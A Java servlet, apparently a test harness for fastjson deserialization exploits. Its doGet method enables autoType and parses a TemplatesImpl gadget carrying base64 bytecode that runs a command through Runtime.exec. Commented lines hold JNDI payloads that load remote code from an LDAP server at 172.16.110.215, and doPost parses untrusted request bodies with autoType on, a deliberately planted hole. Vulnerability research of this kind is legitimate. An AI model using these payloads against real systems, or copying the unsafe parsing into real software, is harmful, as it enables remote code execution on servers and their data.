package com.example.servletdemo; /**
 * @author : Walker
 * @date : Created in 2021/8/10 4:57 PM
 * @description: ${description}
 */

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;

@WebServlet(name = "FJServlet", value = "/hellofj")
public class FJServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();
        out.println("<html><body>");
        out.println("<h1>" + "hello fastjson" + "</h1>");
        out.println("</body></html>");

        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        //45
        //JSON.parseObject("{\"@type\":\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\",\"properties\":{\"data_source\":\"ldap://172.16.110.215:1389/ExecTemplateJDK8\"}}");
        //43
        //JSON.parseObject("{\"v43\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{\"dataSourceName\":\"ldap://172.16.110.215:1389/ExecTemplateJDK8\",\"autoCommit\":true]}}}");
        //42
//        JSON.parseObject("{\"v42\":{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://172.16.110.215:1389/ExecTemplateJDK8\",\"autoCommit\":true}}");
        JSON.parseObject("{\"@type\":\"LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;\",\"_bytecodes\":[\"yv66vgAAADEAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAtTdGF0aWNCbG9jawEADElubmVyQ2xhc3NlcwEAEUxFeHAkU3RhdGljQmxvY2s7AQAKU291cmNlRmlsZQEACEV4cC5qYXZhDAAEAAUHABMBAA9FeHAkU3RhdGljQmxvY2sBABBqYXZhL2xhbmcvT2JqZWN0AQADRXhwAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAFAoAFQAPAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAGAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMABoAGwoAGQAcAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAgAHgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMACAAIQoAGQAiACEAAgAVAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ABaxAAAAAgAHAAAABgABAAAABwAIAAAADAABAAAABQAJAAwAAAAIABcABQABAAYAAAAWAAIAAAAAAAq4AB0SH7YAI1exAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ\"],\"_name\":\"c\",\"_tfactory\":{},\"outputProperties\":{}}", Feature.SupportNonPublicField);
    }

    @Override
    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        InputStreamReader insr = new InputStreamReader(request.getInputStream(),"utf-8");
        String result = "";
        int respInt = insr.read();
        while(respInt != -1) {
            result += (char)respInt;
            respInt = insr.read();
        }
        System.out.println(result);

//        String jsontext = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/#ExecTemplateJDK8\", \"autoCommit\":true}";
        JSON.parse(result);
    }
}
